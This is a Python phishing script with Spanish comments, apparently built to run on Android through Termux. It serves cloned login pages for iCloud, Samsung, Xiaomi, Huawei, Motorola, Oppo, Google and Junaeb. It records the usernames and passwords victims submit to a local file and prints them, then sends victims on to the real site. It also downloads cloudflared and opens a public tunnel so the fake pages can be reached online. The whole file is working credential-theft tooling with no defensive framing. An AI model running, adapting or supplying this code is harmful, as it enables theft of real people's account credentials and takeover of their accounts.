import os
import threading
import subprocess
import platform
import re
from time import sleep
from flask import Flask, render_template, redirect, request

SERVICIOS = {
    "01": ("iCloud", "https://www.icloud.com"),
    "02": ("Samsung", "https://account.samsung.com"),
    "03": ("Xiaomi", "https://account.xiaomi.com"),
    "04": ("Huawei", "https://id7.cloud.huawei.com"),
    "05": ("Motorola", "https://motorola.cl"),
    "06": ("Oppo", "https://id.oppo.com"),
    "07": ("Google", "https://google.com"),
    "08": ("Junaeb", "https://junaeb.cl"),
}

def detectar_y_descargar():
    binario = "cloudflared"
    if not os.path.exists(binario):
        print("\033[1;33m[*] Instalando Cloudflared en Termux...\033[0m")
        arch = platform.machine()
        # Usamos arm64 que es el estándar actual de Termux
        if "arm" in arch or "aarch64" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        
        try:
            subprocess.run(["wget", url, "-O", binario], check=True)
            subprocess.run(["chmod", "+x", binario], check=True)
        except:
            print("\033[1;31m[!] Error: Instala wget (pkg install wget)\033[0m")
            os._exit(1)
    return f"./{binario}"

def iniciar_servidor(plantilla, url_real):
    app = Flask(__name__)
    @app.route('/')
    def index(): return render_template(plantilla)
    @app.route('/submit', methods=['POST'])
    def submit():
        u, p = request.form.get('username'), request.form.get('password')
        if u and p:
            with open('datos.txt', 'a') as f:
                f.write(f"Servicio: {plantilla} | User: {u} | Pass: {p}\n")
                print(f"\n\nUsuario: {u} | Password: {p}\n")
            return redirect(url_real)
        return redirect('/')
    app.run(port=5000, debug=False, use_reloader=False)

def obtener_link_cloudflare(binario):
    print("\033[1;33m[*] Generando link en Termux...\033[0m")
    # USANDO EL COMANDO SOLICITADO: cloudflared tunnel --url localhost:5000
    proceso = subprocess.Popen(
        [binario, 'tunnel', '--url', 'localhost:5000'],
        stderr=subprocess.PIPE, stdout=subprocess.DEVNULL, text=True
    )
    link = None
    while True:
        linea = proceso.stderr.readline()
        if not linea: break
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', linea)
        if match:
            link = match.group(0)
            print(f"\n\033[1;32m[+] LINK PUBLICO: {link}\033[0m")
            break
    return proceso

def menu():
    bin_cf = detectar_y_descargar()
    while True:
        os.system('clear')
        print(f"\033[1;31m  [>] MODO: \033[1;33mTERMUX / ANDROID\033[0m")
        for id_s, (nombre, _) in SERVICIOS.items():
            print(f" [{id_s}] {nombre}")
        
        op = input("\nSeleccione: ").strip()
        if op in SERVICIOS:
            nombre, url = SERVICIOS[op]
            threading.Thread(target=iniciar_servidor, args=(f"{nombre.lower()}.html", url), daemon=True).start()
            sleep(2)
            proc_cf = obtener_link_cloudflare(bin_cf)
            input("\nENTER para volver...")
            proc_cf.terminate()

if __name__ == '__main__':
    menu()
